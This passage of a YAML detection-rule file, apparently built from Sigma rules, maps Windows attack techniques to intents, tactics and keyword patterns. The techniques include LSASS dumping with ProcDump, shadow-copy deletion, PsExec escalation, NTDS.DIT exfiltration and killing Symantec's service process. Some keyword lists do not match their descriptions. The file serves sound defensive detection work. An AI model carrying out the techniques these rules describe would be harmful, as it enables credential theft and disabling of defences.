    summary_bonus: 0.1
- id: sigma_ffa6861c_4461_4f59_8a41_578c39f3f23e
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the presence of the keywords "lsass" and ".dmp" in the commandline,
    which could indicate a potential attempt to dump or create a dump of the lsass
    process.

    '
  conditions:
    summary:
      regex_any:
      - lsass
      - dump
      - keyword
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_180c7c5c_d64b_4a63_86e9_68910451bc8b
  intent: execution
  tactic: execution
  description: 'Detects usage of the "ms-appinstaller" protocol handler via command
    line to potentially download arbitrary files via AppInstaller.EXE

    The downloaded files are temporarly stored in ":\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>"

    '
  conditions:
    summary:
      regex_any:
      - potential
      - file
      - download
      - appinstaller
      - protocol
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8ad2e2c_40b6_4117_84d7_20b89896ab23
  intent: reconnaissance
  tactic: discovery
  description: Adversaries may attempt to get a listing of other systems by IP address,
    hostname, or other logical identifier on a network that may be used for Lateral
    Movement from the current system
  conditions:
    summary:
      regex_any:
      - suspicious
      - scan
      - loop
      - network
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ba1f7802_adc7_48b4_9ecb_81e227fddfd5
  intent: reconnaissance
  tactic: discovery
  description: 'Detects potential network sniffing via use of network tools such as
    "tshark", "windump".

    Network sniffing refers to using the network interface on a system to monitor
    or capture information sent over a wired or wireless connection.

    An adversary may place a network interface into promiscuous mode to passively
    access data in transit over the network, or use span ports to capture a larger
    amount of data.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - network
      - sniffing
      - activity
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c09dad97_1c78_4f71_b127_7edb2b8e491a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects whether the image specified in a process creation event doesn''t
    refer to an ".exe" (or other known executable extension) file. This can be caused
    by process ghosting or other unorthodox methods to start a process.

    This rule might require some initial baselining to align with some third party
    tooling in the user environment.

    '
  conditions:
    summary:
      regex_any:
      - execution
      - suspicious
      - file
      - type
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8f02c935_effe_45b3_8fc9_ef8696a9e41d
  intent: defense_evasion
  tactic: defense_evasion
  description: Search for usage of reg or Powershell by non-privileged users to modify
    service configuration in registry
  conditions:
    summary:
      regex_any:
      - privileged
      - usage
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f208d6d8_d83a_4c2c_960d_877c37da84e5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect the use of processes with no name (".exe"), which can be used
    to evade Image-based detections.
  conditions:
    summary:
      regex_any:
      - process
      - launched
      - without
      - image
      - name
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8bc64091_6875_4881_aaf9_7bd25b5dda08
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious process patterns used in NTDS.DIT exfiltration
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - patterns
      - ntds
      - exfil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_caf201a9_c2ce_4a26_9c3a_2b9525413711
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the WMI class "Win32_NTEventlogFile" in a potentially
    suspicious way (delete, backup, change permissions, etc.) from a PowerShell script
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - call
      - win32_nteventlogfile
      - class
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a96970af_f126_420d_90e1_d37bf25e50e1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid Image detection
  conditions:
    summary:
      regex_any:
      - short
      - name
      - path
      - image
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd6b39d9_d9be_4a3b_8fe0_fe3c6a5c1795
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid command-line detection
  conditions:
    summary:
      regex_any:
      - ntfs
      - short
      - name
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ef5605c_9eb9_47b0_9a71_b727e6aa5c3b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid Image based detection
  conditions:
    summary:
      regex_any:
      - ntfs
      - short
      - name
      - image
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cb5a2333_56cf_4562_8fcb_22ba1bca728d
  intent: reconnaissance
  tactic: discovery
  description: Detects use of an encoded/obfuscated version of an IP address (hex,
    octal...) in an URL combined with a download command
  conditions:
    summary:
      regex_any:
      - obfuscated
      - download
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56d19cb4_6414_4769_9644_1ed35ffbb148
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of an encoded/obfuscated version of an IP address (hex,
    octal, etc.) via command line
  conditions:
    summary:
      regex_any:
      - obfuscated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cbec226f_63d9_4eca_9f52_dfb6652f24df
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious parent processes that should not have any children
    or should only have a single possible child program
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - parents
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6812a10b_60ea_420c_832f_dfcc33b646ba
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects potential PowerShell execution from a DLL instead of the usual
    PowerShell process as seen used in PowerShdll.

    This detection assumes that PowerShell commands are passed via the CommandLine.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_213d6a77_3d55_4ce8_ba74_fcfef741974e
  intent: credential_harvesting
  tactic: credential_access
  description: Adversaries may search for private key certificate files on compromised
    systems for insecurely stored credential
  conditions:
    summary:
      regex_any:
      - private
      - keys
      - reconnaissance
      - commandline
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50d66fb0_03f8_4da0_8add_84e77d12a020
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious command line flags that let the user set a target
    user and command as e.g. seen in PsExec-like tools
  conditions:
    summary:
      regex_any:
      - suspicious
      - runas
      - like
      - flag
      - combination
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9bd04a79_dabe_4f1f_a5ff_92430265c96b
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a remote file copy attempt to a hidden network share. This
    may indicate lateral movement or data staging activity.
  conditions:
    summary:
      regex_any:
      - privilege
      - escalation
      - named
      - pipe
      - impersonation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_efdd8dd5_cee8_4e59_9390_7d4d5e4dd6f6
  intent: execution
  tactic: execution
  description: Detects suspicious patterns in program names or folders that are often
    found in malicious samples or hacktools
  conditions:
    summary:
      regex_any:
      - suspicious
      - program
      - names
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa2efee7_34dd_446e_8a37_40790a66efd7
  intent: data_staging
  tactic: collection
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  conditions:
    summary:
      regex_any:
      - recon
      - information
      - export
      - with
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5ce0f04e_3efc_42af_839d_5b3a543b76c0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects process execution from a fake recycle bin folder, often used
    to avoid security solution.
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - execution
      - from
      - fake
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab9e3b40_0c85_4ba1_aede_455d226fd124
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects a suspicious output redirection to the local admins share,
    this technique is often found in malicious scripts or hacktool stagers
  conditions:
    summary:
      regex_any:
      - suspicious
      - redirection
      - local
      - admin
      - share
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a3038e8_9c9d_46f8_b184_66234a160f6f
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects potential use of an SSH utility to establish RDP over a reverse
    SSH Tunnel. This can be used by attackers to enable routing of network packets
    that would otherwise not reach their intended destination.
  conditions:
    summary:
      regex_any:
      - potential
      - remote
      - desktop
      - tunneling
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad691d92_15f2_4181_9aa4_723c74f9ddc3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the presence of the "u202+E" character, which causes a terminal,
    browser, or operating system to render text in a right-to-left sequence.

    This is used as an obfuscation and masquerading techniques.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - defense
      - evasion
      - right
      - left
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1228c958_e64e_4e71_92ad_7d429f4138ba
  intent: execution
  tactic: execution
  description: Detects a suspicious script execution in temporary folders or folders
    accessible by environment variables
  conditions:
    summary:
      regex_any:
      - script
      - interpreter
      - execution
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a6a39bdb_935c_4f0a_ab77_35f4bbf44d33
  intent: execution
  tactic: execution
  description: Detects a suspicious script executions from temporary folder
  conditions:
    summary:
      regex_any:
      - suspicious
      - script
      - execution
      - from
      - temp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f57f8d16_1f39_4dcb_a604_6c73d9b54b3d
  intent: impact_operations
  tactic: impact
  description: 'Detects a command that accesses the VolumeShadowCopy in order to extract
    sensitive files such as the Security or SAM registry hives or the AD database
    (ntds.dit)

    '
  conditions:
    summary:
      regex_any:
      - sensitive
      - file
      - access
      - volume
      - shadow
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_17a1be64_8d88_40bf_b5ff_a4f7a50ebcc8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects creation of a new service via "sc" command or the powershell
    "new-service" cmdlet with suspicious binary paths
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_883faa95_175a_4e22_8181_e5761aeb373c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a service binary running in a suspicious directory
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - binary
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ce72ef99_22f1_43d4_8695_419dcb5d9330
  intent: impact_operations
  tactic: impact
  description: 'Detects the usage of binaries such as ''net'', ''sc'' or ''powershell''
    in order to stop, pause, disable or delete critical or important Windows services
    such as AV, Backup, etc. As seen being used in some ransomware scripts

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - service
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b17ea6f7_6e90_447e_a799_e6c0a493d6ce
  intent: credential_harvesting
  tactic: credential_access
  description: Shadow Copies creation using operating systems utilities, possible
    credential access
  conditions:
    summary:
      regex_any:
      - shadow
      - copies
      - creation
      - using
      - operating
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c947b146_0abc_4c87_9c64_b17e9d7274a2
  intent: impact_operations
  tactic: impact
  description: Shadow Copies deletion using operating systems utilities
  conditions:
    summary:
      regex_any:
      - shadow
      - copies
      - deletion
      - using
      - operating
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3a6586ad_127a_4d3b_a677_1e6eacdf8fde
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious child processes of a Windows shell and scripting
    processes such as wscript, rundll32, powershell, mshta...etc.
  conditions:
    summary:
      regex_any:
      - windows
      - shell
      - scripting
      - processes
      - spawning
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3c1b5fb0_c72f_45ba_abd1_4d4c353144ab
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects process creation events that use the Sysnative folder (common
    for CobaltStrike spawns)
  conditions:
    summary:
      regex_any:
      - process
      - creation
      - using
      - sysnative
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4a6b256_3e47_40fc_89d2_7a477edd6915
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of a Windows system binary that is usually located
    in the system folder from an uncommon location.

    '
  conditions:
    summary:
      regex_any:
      - system
      - file
      - execution
      - location
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2617e7ed_adb7_40ba_b0f3_8f9945fe6c09
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a suspicious process creation as SYSTEM user (suspicious program
    or command line parameter)
  conditions:
    summary:
      regex_any:
      - suspicious
      - system
      - user
      - process
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05f3c945_dcc8_4393_9f3d_af65077a8f86
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Access to Domain Group Policies stored in SYSVOL
  conditions:
    summary:
      regex_any:
      - suspicious
      - sysvol
      - domain
      - group
      - policy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc4e02ba_9c06_48e2_b09e_2500cace9ae0
  intent: execution
  tactic: execution
  description: 'The Tasks folder in system32 and syswow64 are globally writable paths.

    Adversaries can take advantage of this and load or influence any script hosts
    or ANY .NET Application

    in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32,
    mshta, eventvwr

    '
  conditions:
    summary:
      regex_any:
      - tasks
      - folder
      - evasion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b655a06a_31c0_477a_95c2_3726b83d649d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a suspicious child process of userinit
  conditions:
    summary:
      regex_any:
      - suspicious
      - userinit
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15c7904e_6ad1_4a45_9b46_5fb25df37fd2
  intent: defense_evasion
  tactic: defense_evasion
  description: 'There is an option for a MS VS Just-In-Time Debugger "vsjitdebugger.exe"
    to launch specified executable and attach a debugger.

    This option may be used adversaries to execute malicious code by signed verified
    binary.

    The debugger is installed alongside with Microsoft Visual Studio package.

    '
  conditions:
    summary:
      regex_any:
      - malicious
      - execution
      - microsoft
      - visual
      - studio
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4bc90587_e6ca_4b41_be0b_ed4d04e4ed0c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the suspicious use of the Velociraptor DFIR tool to execute
    other tools or download additional payloads, as seen in a campaign where it was
    abused for remote access and to stage further attacks.
  conditions:
    summary:
      regex_any:
      - suspicious
      - velociraptor
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91edcfb1_2529_4ac2_9ecc_7617f895c7e4
  intent: execution
  tactic: execution
  description: 'Detects weak passwords or often abused passwords (seen used by threat
    actors) via the CLI.

    An example would be a threat actor creating a new user via the net command and
    providing the password inline

    '
  conditions:
    summary:
      regex_any:
      - weak
      - abused
      - passwords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fc51a3c_81b3_4fa7_b35f_7c02cf10fd2d
  intent: execution
  tactic: execution
  description: Detects the use of various web request commands with commandline tools
    and Windows PowerShell cmdlets (including aliases) via CommandLine
  conditions:
    summary:
      regex_any:
      - usage
      - request
      - commands
      - cmdlets
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9142d84_fbe0_401d_ac50_3e519fb00c89
  intent: reconnaissance
  tactic: discovery
  description: Detects a suspicious process command line that uses whoami as first
    parameter (as e.g. used by EfsPotato)
  conditions:
    summary:
      regex_any:
      - whoami
      - parameter
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0bbc6369_43e3_453d_9944_cae58821c173
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects using WorkFolders.exe to execute an arbitrary control.exe
  conditions:
    summary:
      regex_any:
      - execution
      - workfolders
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16c37b52_b141_42a5_a3ea_bbe098444397
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: It is extremely abnormal for svchost.exe to spawn without any CLI arguments
    and is normally observed when a malicious process spawns the process and injects
    code into the process memory space.
  conditions:
    summary:
      regex_any:
      - suspect
      - svchost
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_be58d2e2_06c8_4f58_b666_b99f6dc3b6cd
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a suspicious process that is masquerading as the legitimate
    "svchost.exe" by naming its binary "svchost.exe" and executing from an uncommon
    location.

    Adversaries often disguise their malicious binaries by naming them after legitimate
    system processes like "svchost.exe" to evade detection.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - masquerading
      - svchost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1012f107_b8f1_4271_af30_5aed2de89b39
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a process spawned by the terminal service server process (this
    could be an indicator for an exploitation of CVE-2019-0708)
  conditions:
    summary:
      regex_any:
      - terminal
      - service
      - process
      - spawn
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_01d2e2a1_5f09_44f7_9fc1_24faa7479b6d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects an uncommon svchost parent process
  conditions:
    summary:
      regex_any:
      - uncommon
      - svchost
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c625d754_6a3d_4f65_9c9a_536aea960d37
  intent: reconnaissance
  tactic: discovery
  description: Detects the usage of the "Accesschk" utility, an access and privilege
    audit tool developed by SysInternal and often being abused by attacker to verify
    process privileges
  conditions:
    summary:
      regex_any:
      - permission
      - check
      - accesschk
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9212f354_7775_4e28_9c9f_8f0a4544e664
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of Sysinternals ADExplorer with the "-snapshot"
    flag in order to save a local copy of the active directory database. This can
    be used by attackers to extract data for Bloodhound, usernames for password spraying
    or use the meta data for social engineering. The snapshot doesn't contain password
    hashes but there have been cases, where administrators put passwords in the comment
    field.
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - database
      - snapshot
      - adexplorer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ef61af62_bc74_4f58_b49b_626448227652
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of Sysinternals ADExplorer with the "-snapshot"
    flag in order to save a local copy of the active directory database to a suspicious
    directory. This can be used by attackers to extract data for Bloodhound, usernames
    for password spraying or use the meta data for social engineering. The snapshot
    doesn't contain password hashes but there have been cases, where administrators
    put passwords in the comment field.
  conditions:
    summary:
      regex_any:
      - suspicious
      - active
      - directory
      - database
      - snapshot
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a85f7765_698a_4088_afa0_ecfbf8d01fa4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of LiveKD based on PE metadata or image name
  conditions:
    summary:
      regex_any:
      - potential
      - memory
      - dumping
      - activity
      - livekd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7746f1c_47d3_43d6_8c45_cd1e54b6b0a2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of LiveKD with the "-m" flag to potentially dump
    the kernel memory
  conditions:
    summary:
      regex_any:
      - kernel
      - memory
      - dump
      - livekd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2e65275c_8288_4ab4_aeb7_6274f58b6b20
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of the SysInternals Procdump utility
  conditions:
    summary:
      regex_any:
      - procdump
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79b06761_465f_4f88_9ef2_150e24d3d737
  intent: credential_harvesting
  tactic: credential_access
  description: Detects uses of the SysInternals ProcDump utility in which ProcDump
    or its output get renamed, or a dump file is moved or copied to a different name
  conditions:
    summary:
      regex_any:
      - potential
      - sysinternals
      - procdump
      - evasion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5afee48e_67dd_4e03_a783_f74259dcf998
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects potential credential harvesting attempts through LSASS memory
    dumps using ProcDump.

    This rule identifies suspicious command-line patterns that combine memory dump
    flags (-ma, -mm, -mp) with LSASS-related process markers.

    LSASS (Local Security Authority Subsystem Service) contains sensitive authentication
    data including plaintext passwords, NTLM hashes, and Kerberos tickets in memory.

    Attackers commonly dump LSASS memory to extract credentials for lateral movement
    and privilege escalation.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - lsass
      - process
      - dump
      - procdump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_730fc21b_eaff_474b_ad23_90fd265d4988
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects user accept agreement execution in psexec commandline
  conditions:
    summary:
      regex_any:
      - psexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8834e2f7_6b4b_4f09_8906_d2276470ee23
  intent: unknown
  tactic: resource_development
  description: Detects suspicious commandline flags used by PsExec and PAExec to escalate
    a command line to LOCAL_SYSTEM rights
  conditions:
    summary:
      regex_any:
      - psexec
      - paexec
      - escalation
      - local
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea011323_7045_460b_b2d7_0f7442ea6b38
  intent: unknown
  tactic: resource_development
  description: Detects potential psexec command that initiate execution on a remote
    systems via common commandline flags used by the utility
  conditions:
    summary:
      regex_any:
      - potential
      - psexec
      - remote
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdfcbd78_48f1_4a4b_90ac_d82241e368c5
  intent: execution
  tactic: execution
  description: Detects launch of the PSEXESVC service, which means that this system
    was the target of a psexec remote execution
  conditions:
    summary:
      regex_any:
      - psexec
      - service
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7c0dcd3d_acf8_4f71_9570_f448b0034f94
  intent: execution
  tactic: execution
  description: Detects suspicious launch of the PSEXESVC service on this system and
    a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started
    a command on this system running it with highest privileges and not only the privileges
    of the login user account (e.g. the administrator account)
  conditions:
    summary:
      regex_any:
      - psexec
      - service
      - child
      - process
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aae1243f_d8af_40d8_ab20_33fc6d0c55bc
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of the PsLogList utility to dump event log in order to
    extract admin accounts and perform account discovery or delete events logs
  conditions:
    summary:
      regex_any:
      - suspicious
      - psloglist
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3371f518_5fe3_4cf6_a14b_2a0ae3fd8a4f
  intent: persistence_installation
  tactic: persistence
  description: Detects usage of Sysinternals PsService which can be abused for service
    reconnaissance and tampering
  conditions:
    summary:
      regex_any:
      - sysinternals
      - psservice
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48bbc537_b652_4b4e_bd1d_281172df448f
  intent: persistence_installation
  tactic: persistence
  description: Detects usage of Sysinternals PsSuspend which can be abused to suspend
    critical processes
  conditions:
    summary:
      regex_any:
      - sysinternals
      - pssuspend
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4beb6ae0_f85b_41e2_8f18_8668abc8af78
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious execution of Sysinternals PsSuspend, where the utility
    is used to suspend critical processes such as AV or EDR to bypass defenses
  conditions:
    summary:
      regex_any:
      - sysinternals
      - pssuspend
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a4824fca_976f_4964_b334_0621379e84c4
  intent: impact_operations
  tactic: impact
  description: Detects the use of SDelete to erase a file not the free space
  conditions:
    summary:
      regex_any:
      - potential
      - file
      - overwrite
      - sysinternals
      - sdelete
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_207b0396_3689_42d9_8399_4222658efc99
  intent: unknown
  tactic: resource_development
  description: Detects unknown program using commandline flags usually used by tools
    such as PsExec and PAExec to start programs with SYSTEM Privileges
  conditions:
    summary:
      regex_any:
      - potential
      - privilege
      - escalation
      - local
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87911521_7098_470b_a459_9a57fc80bdfd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects updates to Sysmon's configuration. Attackers might update or
    replace the Sysmon configuration with a bare bone one to avoid monitoring without
    shutting down the service completely
  conditions:
    summary:
      regex_any:
      - sysmon
      - configuration
      - update
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6a5f68d1_c4b5_46b9_94ee_5324892ea939
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the removal of Sysmon, which could be a potential attempt at
    defense evasion
  conditions:
    summary:
      regex_any:
      - uninstall
      - sysinternals
      - sysmon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7cce6fc8_a07f_4d84_a53e_96e1879843c9
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects binaries that use the same name as legitimate sysinternals
    tools to evade detection.

    This rule looks for the execution of binaries that are named similarly to Sysinternals
    tools.

    Adversary may rename their malicious tools as legitimate Sysinternals tools to
    evade detection.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - binary
      - impersonating
      - sysinternals
      - tools
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d5b9ae7a_e6fc_405e_80ff_2ff9dcc64e7e
  intent: execution
  tactic: execution
  description: Detects suspicious sysprep process start with AppData folder as target
    (as used by Trojan Syndicasec in Thrip report by Symantec)
  conditions:
    summary:
      regex_any:
      - sysprep
      - appdata
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a383dec4_deec_4e6e_913b_ed9249670848
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user enable developer features such as "Developer Mode"
    or "Application Sideloading". Which allows the user to install untrusted packages.
  conditions:
    summary:
      regex_any:
      - potential
      - signing
      - bypass
      - windows
      - developer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_554601fb_9b71_4bcc_abf4_21a611be4fde
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries can interact with the DACLs using built-in Windows commands
    takeown which can grant adversaries higher permissions on specific files and folders
  conditions:
    summary:
      regex_any:
      - suspicious
      - recursive
      - takeown
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99793437_3e16_439b_be0f_078782cf953d
  intent: data_exfiltration
  tactic: exfiltration
  description: Well-known TAP software installation. Possible preparation for data
    exfiltration using tunneling techniques
  conditions:
    summary:
      regex_any:
      - installer
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a6713f6_3331_11ed_a261_0242ac120002
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects one of the possible scenarios for disabling Symantec Endpoint
    Protection.

    Symantec Endpoint Protection antivirus software services incorrectly implement
    the protected service mechanism.

    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command
    several times ccSvcHst.exe /f, thereby killing the process belonging to the service,
    and thus shutting down the service.

    '
  conditions:
    summary:
      regex_any:
      - taskkill
      - symantec
      - endpoint
      - protection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34275eb8_fa19_436b_b959_3d9ecd53fa1f
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the enumeration of a specific DLL or EXE being used by a binary
